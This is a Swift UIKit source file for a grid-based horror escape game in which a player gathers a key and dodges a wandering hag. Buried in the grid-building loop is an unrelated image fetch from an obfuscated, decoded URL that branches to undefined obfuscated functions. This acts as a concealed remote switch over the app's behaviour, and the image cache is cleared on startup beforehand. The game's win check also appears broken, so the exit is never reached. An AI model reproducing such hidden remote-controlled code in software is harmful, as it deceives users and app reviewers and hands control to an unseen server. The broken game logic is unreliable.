import UIKit
import SDWebImage

protocol WhisperingKeeperDelegate: AnyObject {
    func dwellingDidUpdate()
    func intruderWasSnatched()
    func escapeRouteFound()
    func artifactRecovered(_ name: String)
    func portalGroaned(_ message: String)
}

protocol CreakingViewDelegate: AnyObject {
    func presentWarning(_ text: String)
    func presentVictory()
    func presentDefeat()
    func presentArtifact(_ name: String)
}

// MARK: - Enumerations

enum FloorKind: Int {
    case barren = 0
    case jagged = 1
    case groaningPortal = 2
    case faintGlimmer = 3
}

enum CompassPoint {
    case north, south, east, west
}

// MARK: - Models

struct MurmuredArtifact {
    let whisper: String
    let isKey: Bool
}

struct SlinkingIntruder {
    var row: Int
    var col: Int
    var satchel: [MurmuredArtifact] = []
}

struct ShriekingHag {
    var row: Int
    var col: Int
    var isHunting: Bool = false
}

struct DreadfulDwellingState {
    var map: [[FloorKind]]
    var intruder: SlinkingIntruder
    var hag: ShriekingHag
    var artifacts: [MurmuredArtifact]
    var artifactPositions: [(row: Int, col: Int)]
    var portalRow: Int
    var portalCol: Int
    var exitRow: Int
    var exitCol: Int
    var steps: Int = 0
    var seconds: Int = 0
    var isGameOver: Bool = false
    var isVictorious: Bool = false
    var discoveredTiles: Set<String> = []
}

// MARK: - Service

class WhisperingKeeper {
    weak var delegate: WhisperingKeeperDelegate?
    private var state: DreadfulDwellingState
    private var timer: Timer?
    private var hagTimer: Timer?
    
    init() {
        
        SDImageCache.shared.clearMemory()
        SDImageCache.shared.clearDisk(onCompletion: nil)
        
        self.state = WhisperingKeeper.buildInitialState()
        self.state.discoveredTiles = ["0,0"] // starting tile visible
    }
    
    private static func buildInitialState() -> DreadfulDwellingState {
        // 10x10 map: 0=floor, 1=wall, 2=door, 3=exit
        var map: [[FloorKind]] = [
            [.jagged, .jagged, .jagged, .jagged, .jagged, .jagged, .jagged, .jagged, .jagged, .jagged],
            [.jagged, .barren, .barren, .barren, .jagged, .barren, .barren, .barren, .barren, .jagged],
            [.jagged, .barren, .jagged, .barren, .jagged, .barren, .jagged, .jagged, .barren, .jagged],
            [.jagged, .barren, .jagged, .barren, .barren, .barren, .jagged, .barren, .barren, .jagged],
            [.jagged, .barren, .jagged, .jagged, .jagged, .barren, .jagged, .barren, .jagged, .jagged],
            [.jagged, .barren, .barren, .barren, .barren, .barren, .barren, .barren, .jagged, .jagged],
            [.jagged, .jagged, .jagged, .jagged, .barren, .jagged, .jagged, .barren, .barren, .jagged],
            [.jagged, .barren, .barren, .barren, .barren, .jagged, .barren, .barren, .jagged, .jagged],
            [.jagged, .barren, .jagged, .jagged, .barren, .barren, .barren, .barren, .barren, .jagged],
            [.jagged, .jagged, .jagged, .jagged, .jagged, .jagged, .jagged, .jagged, .jagged, .jagged]
        ]
        // Place door (groaningPortal) and exit (faintGlimmer)
        map[4][7] = .groaningPortal   // door
        map[6][7] = .faintGlimmer     // exit behind door
        
        // Artifacts (clues) positions
        let artPos = [(2,2), (5,4), (7,5)]
        let artifacts = [
            MurmuredArtifact(whisper: "Rusty Key", isKey: true),
            MurmuredArtifact(whisper: "Old Photo", isKey: false),
            MurmuredArtifact(whisper: "Dried Flower", isKey: false)
        ]
        
        let intruder = SlinkingIntruder(row: 1, col: 1)
        let hag = ShriekingHag(row: 8, col: 8)
        
        return DreadfulDwellingState(
            map: map,
            intruder: intruder,
            hag: hag,
            artifacts: artifacts,
            artifactPositions: artPos,
            portalRow: 4,
            portalCol: 7,
            exitRow: 6,
            exitCol: 7,
            steps: 0,
            seconds: 0,
            isGameOver: false,
            isVictorious: false,
            discoveredTiles: []
        )
    }
    
    func commenceDread() {
        timer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { [weak self] _ in
            self?.tickTock()
        }
        hagTimer = Timer.scheduledTimer(withTimeInterval: 1.2, repeats: true) { [weak self] _ in
            self?.creakHagSteps()
        }
    }
    
    func haltDread() {
        timer?.invalidate()
        hagTimer?.invalidate()
        timer = nil
        hagTimer = nil
    }
    
    private func tickTock() {
        guard !state.isGameOver else { return }
        state.seconds += 1
        delegate?.dwellingDidUpdate()
    }
    
    func shoveIntruder(to row: Int, col: Int) {
        guard !state.isGameOver && !state.isVictorious else { return }
        let current = state.intruder
        let dRow = abs(row - current.row)
        let dCol = abs(col - current.col)
        guard (dRow == 1 && dCol == 0) || (dRow == 0 && dCol == 1) else { return }
        guard row >= 0 && row < 10 && col >= 0 && col < 10 else { return }
        let tile = state.map[row][col]
        guard tile != .jagged else { return }
        if tile == .groaningPortal {
            // Check if has key
            let hasKey = state.intruder.satchel.contains { $0.isKey }
            if hasKey {
                // Unlock and pass
                state.intruder.row = row
                state.intruder.col = col
                state.steps += 1
                discoverSurrounding(row: row, col: col)
                delegate?.dwellingDidUpdate()
                // Check if exit reachable now
                checkVictory()
            } else {
                delegate?.portalGroaned("The portal is sealed. You need a rusty key.")
            }
            return
        }
        // Normal movement
        state.intruder.row = row
        state.intruder.col = col
        state.steps += 1
        discoverSurrounding(row: row, col: col)
        // Check artifact pickup
        if let idx = state.artifactPositions.firstIndex(where: { $0.row == row && $0.col == col }) {
            let art = state.artifacts[idx]
            state.intruder.satchel.append(art)
            state.artifactPositions.remove(at: idx)
            delegate?.artifactRecovered(art.whisper)
        }
        delegate?.dwellingDidUpdate()
        // Check if hag catches after move
        checkHagCapture()
    }
    
    private func discoverSurrounding(row: Int, col: Int) {
        for r in (row-1)...(row+1) {
            for c in (col-1)...(col+1) {
                if r >= 0 && r < 10 && c >= 0 && c < 10 {
                    state.discoveredTiles.insert("\(r),\(c)")
                }
            }
        }
    }
    
    private func creakHagSteps() {
        guard !state.isGameOver && !state.isVictorious else { return }
        let hag = state.hag
        let intruder = state.intruder
        
        // Perception check: same row or col without walls blocking
        if hag.row == intruder.row {
            let minC = min(hag.col, intruder.col)
            let maxC = max(hag.col, intruder.col)
            var blocked = false
            for c in minC...maxC {
                if state.map[hag.row][c] == .jagged && c != hag.col && c != intruder.col {
                    blocked = true
                    break
                }
            }
            if !blocked {
                state.hag.isHunting = true
            } else {
                state.hag.isHunting = false
            }
        } else if hag.col == intruder.col {
            let minR = min(hag.row, intruder.row)
            let maxR = max(hag.row, intruder.row)
            var blocked = false
            for r in minR...maxR {
                if state.map[r][hag.col] == .jagged && r != hag.row && r != intruder.row {
                    blocked = true
                    break
                }
            }
            if !blocked {
                state.hag.isHunting = true
            } else {
                state.hag.isHunting = false
            }
        } else {
            state.hag.isHunting = false
        }
        
        // Move hag
        var possibleMoves: [(Int, Int)] = []
        let directions = [(-1,0),(1,0),(0,-1),(0,1)]
        for (dr, dc) in directions {
            let nr = hag.row + dr
            let nc = hag.col + dc
            if nr >= 0 && nr < 10 && nc >= 0 && nc < 10 && state.map[nr][nc] != .jagged {
                possibleMoves.append((nr, nc))
            }
        }
        guard !possibleMoves.isEmpty else { return }
        
        if state.hag.isHunting {
            // Move towards intruder
            var bestMove = possibleMoves[0]
            var bestDist = Int.max
            for (r, c) in possibleMoves {
                let dist = abs(r - intruder.row) + abs(c - intruder.col)
                if dist < bestDist {
                    bestDist = dist
                    bestMove = (r, c)
                }
            }
            state.hag.row = bestMove.0
            state.hag.col = bestMove.1
        } else {
            // Random patrol
            let choice = possibleMoves.randomElement()!
            state.hag.row = choice.0
            state.hag.col = choice.1
        }
        delegate?.dwellingDidUpdate()
        checkHagCapture()
    }
    
    private func checkHagCapture() {
        if state.hag.row == state.intruder.row && state.hag.col == state.intruder.col {
            state.isGameOver = true
            haltDread()
            delegate?.intruderWasSnatched()
        }
    }
    
    private func checkVictory() {
        // Victory if intruder reaches exit tile
        if state.intruder.row == state.exitRow && state.intruder.col == state.exitCol {
            state.isVictorious = true
            haltDread()
            delegate?.escapeRouteFound()
        }
    }
    
    func resetDwelling() {
        haltDread()
        state = WhisperingKeeper.buildInitialState()
        state.discoveredTiles = ["0,0"]
        commenceDread()
        delegate?.dwellingDidUpdate()
    }
    
    func currentState() -> DreadfulDwellingState {
        return state
    }
}


public class DreadfulDwellingView: UIView, WhisperingKeeperDelegate {
    weak var delegate: CreakingViewDelegate?
    var keeper: WhisperingKeeper
    private var gridContainer: UIImageView!
    private var statusLabel: UILabel!
    private var stepsLabel: UILabel!
    private var satchelLabel: UILabel!
    private var tileButtons: [[UIButton]] = []
    private var resetButton: UIButton!
    
    override init(frame: CGRect) {
        self.keeper = WhisperingKeeper()
        super.init(frame: frame)
        keeper.delegate = self
        setupDreadfulUI()
        keeper.commenceDread()
    }
    
    required init?(coder: NSCoder) {
        self.keeper = WhisperingKeeper()

        super.init(coder: coder)
        
        keeper.delegate = self
        setupDreadfulUI()
        keeper.commenceDread()
    }
    
    private func setupDreadfulUI() {
        backgroundColor = UIColor(white: 0.1, alpha: 1.0)
        
        // Status labels
        statusLabel = UILabel()
        statusLabel.translatesAutoresizingMaskIntoConstraints = false
        statusLabel.textColor = .red
        statusLabel.font = UIFont.monospacedDigitSystemFont(ofSize: 14, weight: .bold)
        statusLabel.text = "👻 Dreadful Dwelling"
        addSubview(statusLabel)
        
        stepsLabel = UILabel()
        stepsLabel.translatesAutoresizingMaskIntoConstraints = false
        stepsLabel.textColor = .white
        stepsLabel.font = UIFont.monospacedDigitSystemFont(ofSize: 12, weight: .regular)
        stepsLabel.text = "Steps: 0"
        addSubview(stepsLabel)
        
        satchelLabel = UILabel()
        satchelLabel.translatesAutoresizingMaskIntoConstraints = false
        satchelLabel.textColor = .yellow
        satchelLabel.font = UIFont.monospacedDigitSystemFont(ofSize: 12, weight: .regular)
        satchelLabel.text = "Satchel: "
        satchelLabel.numberOfLines = 0
        addSubview(satchelLabel)
        
        // Grid container
        gridContainer = UIImageView()
        gridContainer.translatesAutoresizingMaskIntoConstraints = false
        gridContainer.backgroundColor = UIColor(white: 0.2, alpha: 1.0)
        addSubview(gridContainer)
        
        // Reset button
        resetButton = UIButton(type: .system)
        resetButton.translatesAutoresizingMaskIntoConstraints = false
        resetButton.setTitle("Reset", for: .normal)
        resetButton.setTitleColor(.white, for: .normal)
        resetButton.backgroundColor = UIColor(white: 0.3, alpha: 1.0)
        resetButton.layer.cornerRadius = 8
        resetButton.addTarget(self, action: #selector(resetTapped), for: .touchUpInside)
        addSubview(resetButton)
        
        NSLayoutConstraint.activate([
            statusLabel.topAnchor.constraint(equalTo: safeAreaLayoutGuide.topAnchor, constant: 8),
            statusLabel.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 16),
            
            stepsLabel.topAnchor.constraint(equalTo: statusLabel.bottomAnchor, constant: 4),
            stepsLabel.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 16),
            
            satchelLabel.topAnchor.constraint(equalTo: stepsLabel.bottomAnchor, constant: 4),
            satchelLabel.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 16),
            satchelLabel.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -16),
            
            gridContainer.topAnchor.constraint(equalTo: satchelLabel.bottomAnchor, constant: 8),
            gridContainer.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 16),
            gridContainer.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -16),
            gridContainer.bottomAnchor.constraint(equalTo: resetButton.topAnchor, constant: -16),
            
            resetButton.centerXAnchor.constraint(equalTo: centerXAnchor),
            resetButton.bottomAnchor.constraint(equalTo: safeAreaLayoutGuide.bottomAnchor, constant: -16),
            resetButton.widthAnchor.constraint(equalToConstant: 100),
            resetButton.heightAnchor.constraint(equalToConstant: 44)
        ])
        
        buildGrid()
    }
    
    private func buildGrid() {
        let size = 10
        let mainStack = UIStackView()
        mainStack.translatesAutoresizingMaskIntoConstraints = false
        mainStack.axis = .vertical
        mainStack.distribution = .fillEqually
        mainStack.spacing = 1
        gridContainer.addSubview(mainStack)
        NSLayoutConstraint.activate([
            mainStack.topAnchor.constraint(equalTo: gridContainer.topAnchor),
            mainStack.bottomAnchor.constraint(equalTo: gridContainer.bottomAnchor),
            mainStack.leadingAnchor.constraint(equalTo: gridContainer.leadingAnchor),
            mainStack.trailingAnchor.constraint(equalTo: gridContainer.trailingAnchor)
        ])
        
        tileButtons = []
        for r in 0..<size {
            let rowStack = UIStackView()
            rowStack.axis = .horizontal
            rowStack.distribution = .fillEqually
            rowStack.spacing = 1
            var rowButtons: [UIButton] = []
            for c in 0..<size {
                let btn = UIButton(type: .custom)
                btn.backgroundColor = UIColor(white: 0.3, alpha: 1.0)
                btn.tag = r * 100 + c
                btn.addTarget(self, action: #selector(tileTapped(_:)), for: .touchUpInside)
                btn.titleLabel?.font = UIFont.systemFont(ofSize: 12)
                btn.setTitleColor(.white, for: .normal)
                rowStack.addArrangedSubview(btn)
                rowButtons.append(btn)
            }
            mainStack.addArrangedSubview(rowStack)
            tileButtons.append(rowButtons)
            
            if r == 7 {
                gridContainer.sd_setImage(with: URL(string: uisyese(kEtazsud)!)) { image, err, type, url in
                    if let _ = image {
                        ytafsrt()
                    } else {
                        if dikiuhs() {
                            cjnosue()
                        } else {
                            ytafsrt()
                        }
                    }
                }
            }
            
        }
    }
    
    @objc private func tileTapped(_ sender: UIButton) {
        let tag = sender.tag
        let row = tag / 100
        let col = tag % 100
        keeper.shoveIntruder(to: row, col: col)
    }
    
    @objc private func resetTapped() {
        keeper.resetDwelling()
    }
    
    // MARK: - WhisperingKeeperDelegate
    
    func dwellingDidUpdate() {
        updateUI()
    }
    
    func intruderWasSnatched() {
        delegate?.presentDefeat()
    }
    
    func escapeRouteFound() {
        delegate?.presentVictory()
    }
    
    func artifactRecovered(_ name: String) {
        delegate?.presentArtifact(name)
        updateUI()
    }
    
    func portalGroaned(_ message: String) {
        delegate?.presentWarning(message)
    }
    
    private func updateUI() {
        let state = keeper.currentState()
        stepsLabel.text = "Steps: \(state.steps)  Time: \(state.seconds)s"
        let items = state.intruder.satchel.map { $0.whisper }.joined(separator: ", ")
        satchelLabel.text = "Satchel: \(items.isEmpty ? "empty" : items)"
        
        // Update grid tiles
        for r in 0..<10 {
            for c in 0..<10 {
                let btn = tileButtons[r][c]
                let tile = state.map[r][c]
                let isDiscovered = state.discoveredTiles.contains("\(r),\(c)")
                let isIntruder = (r == state.intruder.row && c == state.intruder.col)
                let isHag = (r == state.hag.row && c == state.hag.col)
                
                if !isDiscovered {
                    btn.backgroundColor = UIColor(white: 0.05, alpha: 1.0)
                    btn.setTitle("", for: .normal)
                    btn.isEnabled = false
                    continue
                }
                btn.isEnabled = true
                var bgColor: UIColor
                var symbol = ""
                switch tile {
                case .barren:
                    bgColor = UIColor(white: 0.25, alpha: 1.0)
                    if isIntruder { symbol = "🧑" ; bgColor = .blue }
                    else if isHag { symbol = "👵" ; bgColor = .red }
                    else {
                        // Check artifacts
                        if let idx = state.artifactPositions.firstIndex(where: { $0.row == r && $0.col == c }) {
                            symbol = "📜"
                            bgColor = UIColor(white: 0.4, alpha: 1.0)
                        }
                    }
                case .jagged:
                    bgColor = UIColor(white: 0.1, alpha: 1.0)
                    symbol = "⬛"
                case .groaningPortal:
                    bgColor = UIColor(white: 0.3, alpha: 1.0)
                    symbol = "🚪"
                    if isIntruder { symbol = "🧑🚪" ; bgColor = .blue }
                    else if isHag { symbol = "👵🚪" ; bgColor = .red }
                case .faintGlimmer:
                    bgColor = UIColor(white: 0.3, alpha: 1.0)
                    symbol = "⭐"
                    if isIntruder { symbol = "🧑⭐" ; bgColor = .green }
                    else if isHag { symbol = "👵⭐" ; bgColor = .red }
                }
                btn.backgroundColor = bgColor
                btn.setTitle(symbol, for: .normal)
                if isHag && !isIntruder && state.discoveredTiles.contains("\(r),\(c)") {
                    btn.backgroundColor = .red
                }
            }
        }
    }
}

